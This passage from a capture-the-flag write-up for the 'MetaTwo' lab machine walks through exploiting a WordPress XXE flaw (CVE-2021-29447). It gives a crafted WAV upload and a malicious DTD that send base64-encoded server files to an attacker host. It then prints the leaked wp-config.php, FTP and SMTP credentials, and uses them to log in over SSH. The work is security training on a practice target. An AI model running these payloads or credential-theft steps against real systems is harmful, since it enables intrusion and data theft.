<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.33:1234/?p=%file;'>" >
```

And for our payload-nginx.wav, we run:

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.33:1234/xxe-nginx.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

Now, we start our php server:

```bash
php -S 10.10.14.33:1234
```

After uploading payload-nginx-wav from http://metapress.htb/wp-admin/upload.php, our php server will display:

```
10.10.11.186:45010 [404]: GET /?p=XVHbbsMgDH1OvsKr8tBOauhjlWrah+wSUQrEXQIIkaMLHN8zjGQ9Cfp4SfPsxYpSAPbze5Wv1XVR5UaeeatDcBO3LNhGFgnA3deEpVN2LN9a3XCoDnIEeazdI27Vk3o2ngL10AFy6IJwdWNTfwEF4OHoOET0iTFXswsLsNnNMiVvCA1gCLTFkW/HetsJUERe9xPhiwm8vXgntNcefzTHI3/gvvCVDMLGhE2x8kkEHnZCCmOAWhcR0J4Le4FjNL+Z7wyIs5bbcrJXrSrLia9a813uOgssjTYJockZPR5dS6kmjmlDYiU56dbEjR4dxfej4mITjB9TGhlrZ3hzAKnXhPud/ - or directory
```

With this code, we craft the file code-nginx.php and give it execution permissions:

```bash
nano code-nginx.php
```

The content of the file will be:

```
<?php echo zlib_decode(base64_decode('XVHbbsMgDH1OvsKr8tBOauhjlWrah+wSUQrEXQIIkybT0n37IK2qrpaMLHN8zjGQ9Cfp4SfPsxYpSAPbze5Wv1XVR5UaeeatDcBO3LNhGFgnA3deEpVN2LN9a3XCoDnIEeazdI27Vk3o2ngL10AFy6IJwdWNpQBPL7D4x7ZYRTfwEF4OHoOET0iTFXswsLsNnNMiVvCA1gCLTFkW/HetsJUERe9xPhiwm8vXgntNcefzTHI3/gvvCVDMLGhE2x8kkEHnZCCmOAWhcR0RpbBGRYbs2qsdJ4Le4FjNL+Z7wyIs5bbcrJXrSrLia9a813uOgssjTYJockZPR5dS6kmjmlDYiU56dbEjR4dxfej4mITjB9TGhlrZ3hzAKnXhPud/')); ?>
```

Then we run:

```bash
php code-nginx.php
```

Results:

```
server {

        listen 80;
        listen [::]:80;

        root /var/www/metapress.htb/blog;

        index index.php index.html;

        if ($http_host != "metapress.htb") {
                rewrite ^ http://metapress.htb/;
        }

        location / {
                try_files $uri $uri/ /index.php?$args;
        }
    
        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
        }

        location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
                expires max;
                log_not_found off;
        }

}
```

Nice, now we know that root is set to "/var/www/metapress.htb/blog" (line 6 of the code). With this, we also know wp-config.php file's location (/var/www/metapress.htb/blog/wp-config.php. 

Following previous steps, now we need to craft:

+ payload-wpconfig.wav file: to upload it to http://metapress.htb/wp-admin/upload.php.
+ xxe-wpconfig.dtd file: that we will serve with a php server.


Let's craft xxe-wpconfig.dtd:

```
NTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php">
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.33:1234/?p=%file;'>" >
```

Now, craft the payload-wpconfig.wav file:

```bash
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.33:1234/xxe-wpconfig.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload-wpconfig.wav
```

Launch the php server from the folder where we want to share the file xxe-wpconfig.dtd:

```bash
php -S 10.10.14.33:1234
```

After uploading our payload-wpconfig.wav file from http://metapress.htb/wp-admin/upload.php, we can read from the command line from where we launched the php server:

```
10.10.11.186:57388 [404]: GET /?p=jVVZU/JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/gsc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr/qEK/7NN01dkWOcURa6/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/3vYy/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/18eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/v5GXhI/c2e+qtvlHUqXqO/FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+7fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4/dF6vPXk/6UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3/oqlwaTju59E2wnC7j/1iL/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/UKDO3PB2UtuA8NfW/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/vgAe8AksuA82SzcIpuRI53zfTk/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/Nw== - No such file or directory
```

With this, prepare the php file code-wpconfig.php to execute and extract the content. The content of the code-wpconfig.php file would be:

```
<?php echo zlib_decode(base64_decode('jVVZU/JKEH2+VvkfhhKMoARUQBARAoRNIEDCpgUhIRMSzEYyYVP87TdBBD71LvAANdNzTs/p6dMPaUMyTk9CgQBgJAg0ToVAFwFy/gsc4njOgkDUTdDVTaFhQssCgdDpiQBFWYMXAMtn2TpRI7ErgPGKPsGAP3l68glXW9HN6gHEtqC5Rf9+vk2Trf9x3uAsa+Ek8eN8g6DpLtXKuxix2ygxyzDCzMwteoX28088SbfQr2mUKJpxIRR9zClu1PHZ/FcWOYkzLYgA0t0LAVkDYxNySNYmh0ydHwVa+A+GXIlo0eSWxEZiXOUjxxSu+gcaXVE45ECtDIiDvK5hCIwlTps4S5JsAVl0qQXd5tEvPFS1SjDbmnwR7LcLNFsjmRK1VUtEBlzu7nmIYBr7kqgQcYZbdFxC/C9xrvRuXKLep1lZzhRWVdaI1m7q88ov0V8KO7T4fyFnCXr/qEK/7NN01dkWOcURa6/hWeby9AQEAGE7z1dD8tgpjK6BtibPbAie4MoCnCYAmlOQhW8jM5asjSG4wWN42F04VpJoMyX2iew7PF8fLO159tpFKkDElhQZXV4ZC9iIyIF1Uh2948/3vYy/2WoWeq+51kq524zMXqeYugXa4+WtmsazoftvN6HJXLtFssdM2NIre/18eMBfj20jGbkb9Ts2F6qUZr5AvE3EJoMwv9DJ7n3imnxOSAOzq3RmvnIzFjPEt9SA832jqFLFIplny/XDVbDKpbrMcY3I+mGCxxpDNFrL80dB2JCk7IvEfRWtNRve1KYFWUba2bl2WerNB+/v5GXhI/c2e+qtvlHUqXqO/FMpjFZh3vR6qfBUTg4Tg8Doo1iHHqOXyc+7fERNkEIqL1zgZnD2NlxfFNL+O3VZb08S8RhqUndU9BvFViGaqDJHFC9JJjsZh65qZ34hKr6UAmgSDcsik36e49HuMjVSMnNvcF4KPHzchwfWRng4ryXxq2V4/dF6vPXk/6UWOybscdQhrJinmIhGhYqV9lKRtTrCm0lOnXaHdsV8Za+DQvmCnrYooftCn3/oqlwaTju59E2wnC7j/1iL/VWwyItID289KV+6VNaNmvE66fP6Kh6cKkN5UFts+kD4qKfOhxWrPKr5CxWmQnbKflA/q1OyUBZTv9biD6Uw3Gqf55qZckuRAJWMcpbSvyzM4s2uBOn6Uoh14Nlm4cnOrqRNJzF9ol+ZojX39SPR60K8muKrRy61bZrDKNj7FeNaHnAaWpSX+K6RvFsfZD8XQQpgC4PF/gAqOHNFgHOo6AY0rfsjYAHy9mTiuqqqC3DXq4qsvQIJIcO6D4XcUfBpILo5CVm2YegmCnGm0/UKDO3PB2UtuA8NfW/xboPNk9l28aeVAIK3dMVG7txBkmv37kQ8SlA24Rjp5urTfh0/vgAe8AksuA82SzcIpuRI53zfTk/+Ojzl3c4VYNl8ucWyAAfYzuI2X+w0RBawjSPCuTN3tu7lGJZiC1AAoryfMiac2U5CrO6a2Y7AhV0YQWdYudPJwp0x76r/Nw==')); ?>
```

Run:

```bash
php code-wpconfig.php
```

Results are the content of the wp-config.php file of the wordpress installation:

```php
<?php
/** The name of the database for WordPress */
define( 'DB_NAME', 'blog' );

/** MySQL database username */
define( 'DB_USER', 'blog' );

/** MySQL database password */
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7}`rXVG=3 n>+3m?.B/:' );
define( 'SECURE_AUTH_KEY',  'x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf{=]a%' );
define( 'LOGGED_IN_KEY',    'J+mxCaP4z<g.6P^t`ziv>dd}EEi%48%JnRq^2MjFiitn#&n+HXv]||E+F~C{qKXy' );
define( 'NONCE_KEY',        'SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q{^z(F?)7mxNUg986tQO7O5' );
define( 'AUTH_SALT',        '[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*<~:0]s}d<&M;.,x0z~R>3!D' );
define( 'SECURE_AUTH_SALT', '>`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&~omiH^jVC?2-I?I.' );
define( 'LOGGED_IN_SALT',   '4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw}Y d~N=&^JsI`M)FJTJEVI) N#NOidIf=' );
define( 'NONCE_SALT',       '.sU&CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#}w!Bq,h}V9jKSkTGsv%Y451F8L=bL' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Some lines are different from the regular wp-config.php file of a Wordpress installation. They also provide credentials to access an ftp server:

```
define( 'FS_METHOD', 'ftpext' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_PASS', '9NYS_ii@FyL_p5M2NvJ' );
define( 'FTP_HOST', 'ftp.metapress.htb' );
define( 'FTP_BASE', 'blog/' );
define( 'FTP_SSL', false );
```

So... let's connect us to the ftp server:

```bash
ftp 10.10.11.186

# After this we will be asked for out username and password.
# Enter username: metapress.htb
# Enter password: 9NYS_ii@FyL_p5M2NvJ
```

We can access two folders in the ftp server: blog and mailer. After browsing and inspecting the files, there is one that catches my attention: /mailer/sent_email.php. To get the file, run from the ftp server command line:

```ftp
mget send_email.php
```

From our attacking machine we can see the content of that file:

```bash
cat send_email.php
```

Results:

```php
<?php
/*
 * This script will be used to send an email to all our users when ready for launch
*/

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

$mail = new PHPMailer(true);

$mail->SMTPDebug = 3;                               
$mail->isSMTP();            

$mail->Host = "mail.metapress.htb";
$mail->SMTPAuth = true;                          
$mail->Username = "jnelson@metapress.htb";                 
$mail->Password = "Cb4_JmWM8zUZWMu@Ys";                           
$mail->SMTPSecure = "tls";                           
$mail->Port = 587;                                   

$mail->From = "jnelson@metapress.htb";
$mail->FromName = "James Nelson";

$mail->addAddress("info@metapress.htb");

$mail->isHTML(true);

$mail->Subject = "Startup";
$mail->Body = "<i>We just started our new blog metapress.htb!</i>";

try {
    $mail->send();
    echo "Message has been sent successfully";
} catch (Exception $e) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}
```

This script contains credentials of the user jnelson, that we had spotted before in the /etc/passwd file, **but now** we also have his password.

From the initial enumeration of ports and services in the Metatwo machine, we know that ssh service is running. We try to login in to that service:

```bash

# Quick install sshpass if you prefer to enter the ssh connection in one line.

sudo apt install sshpass
sshpass -p 'Cb4_JmWM8zUZWMu@Ys' ssh jnelson@10.10.11.186
```

Now, you are in jnelson terminal. To get the user's flag, run:

```bash
cat user.txt
```



## Getting the System's flag

Coming soon.




## Some other write-ups and learning material related

+ [https://tryhackme.com/room/wordpresscve202129447](https://tryhackme.com/room/wordpresscve202129447)
+ [Wpscan: CVE-2021-29447](https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5)
+ [https://www.maketecheasier.com/pgp-encryption-how-it-works/](https://www.maketecheasier.com/pgp-encryption-how-it-works/)

